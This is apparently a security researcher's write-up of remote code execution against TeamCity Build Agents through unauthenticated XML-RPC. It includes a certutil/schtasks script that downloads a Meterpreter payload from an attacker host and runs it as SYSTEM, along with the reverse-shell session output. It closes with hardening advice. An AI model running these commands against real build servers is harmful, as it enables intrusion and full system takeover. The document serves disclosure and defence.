            <h2>Teamcity?</h2>
            <p>
                For those who haven&rsquo;t had the pleasure, TeamCity is a delightful Continuous Integration tool from
                JetBrains. TeamCity is commonly deployed to multiple servers, with one TeamCity server responsible for
                managing build configurations and multiple Build Agent servers responsible for running the builds.
            </p>
            <p>
                The Build Agents can be configured to receive their build commands in either a unidirectional or
                bidirectional mode. In unidirectional mode the Build Agent polls the server for new build commands and
                then runs them. In bidirectional mode the TeamCity server pushes the commands down to the Build Agents
                over port 9090. Up until version 10 this was the default configuration.
            </p>
            <p>
                What is particular charming about this bidirectional mode, is that in its default configuration, there
                is no authentication, authorisation or encryption of the communications between the TeamCity server and
                the Build Agent. Combine this with the fact that it&rsquo;s not uncommon for Build Agents to run as
                System and some real fun can be had.

            <h2>Identifying a TeamCity Agent</h2>
            <p>
                Initially the port appeared as part of an Nmap scan, however service detection was unable to shed much
                light on the port, other than it&rsquo;s an XML-RPC service over HTTP.
            </p>
            <pre><code>PORT     STATE SERVICE VERSION

            <p>
                Unfortunately, the Build Agents don&rsquo;t support any kind of XML-RPC introspection so we have to make
                do with Googling and a bit of guesswork to figure out what the service is expecting.
            </p>
            <p>
                Sending through the simple payload here we at least get an error message which confirms that it is a
                TeamCity Build Agent.

            <h2>Developing an Exploit</h2>
            <p>Perhaps the best strategy is to install a local copy of TeamCity and inspect the traffic with Wireshark.
            </p>
            <p>
                <img src="img/001-teamcity-wireshark.png" alt="TeamCity Wireshark Capture" />
            </p>
            <p>From this we learn that the Build Agent is expecting an XML method call to
                <code>buildAgent.runBuild</code> and the only parameter this method expects is an XML string containing
                our build configuration. Nested within this XML blob we can see our actual command line step,
                <code>echo &amp;quot;Hello World&amp;quot;</code>. Now all we need to do is construct a malicious build
                configuration and we&rsquo;re good to go!</p>
            <p>Starting out small we&rsquo;ll replace our echo command with <code>whoami &gt; C:\pwn.txt</code> to print
                out the account running the TeamCity Build Agent. From this we can see the Build Agent is running as <code>NT
                AUTHORITY\SYSTEM.</code></p>
            <p>
                <img src="img/002-teamcity-local-system.png" alt="TeamCity Running as Local System" />
            </p>
            <p>Let&rsquo;s step things up. We&rsquo;ll throw in a Meterpreter payload and go for a reverse shell then
                call it quits. To do this we&rsquo;ll modify our script to download our Meterpreter payload to a temp
                directory, schedule a task to execute the payload, run the task and then remove it. This is needed as
                the Build Agent will step in and kill our Meterpreter process before we can migrate it somewhere else
                otherwise. We end up with the following build script.</p>
                <pre><code>certutil -urlcache -split -f http://172.16.198.147/meterpreter.exe %TEMP%/meterpreter.exe
schtasks /create /tn msf /tr %TEMP%/meterpreter.exe /sc MONTHLY /ru System
schtasks /run /tn msf
schtasks /delete /tn msf /f</code></pre>
            <p>Now all we need to do is send off our XML-RPC call and catch our shell!</p>
            <pre><code>msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.16.198.147:4444 
[*] Meterpreter session 1 opened (172.16.198.147:4444 -> 172.16.198.149:49411) at 2018-07-24 16:13:52 +0800

            <h2>Closing Thoughts</h2>

            <p>Please, please, please upgrade to TeamCity 10 or later, where XML-RPC is no longer the default
                configuration for Build Agents. Failing that, at the very least disable XML-RPC. This can be done on the
                TeamCity server by setting the following internal property
                <code>teamcity.agent.communicationProtocols=polling</code>. Alternatively, this property can be set on
                the individual Build Agents. The Build Agent&rsquo;s property overrides any properties set by the
                TeamCity server. So any Build Agents which have XML-RPC explicitly enabled will need updating
                regardless.</p>

            <p>Finally, where possible, perhaps don&rsquo;t run TeamCity Build Agents as Local System or with
                administrative permissions. We don&rsquo;t want to make things too easy do we?</p>
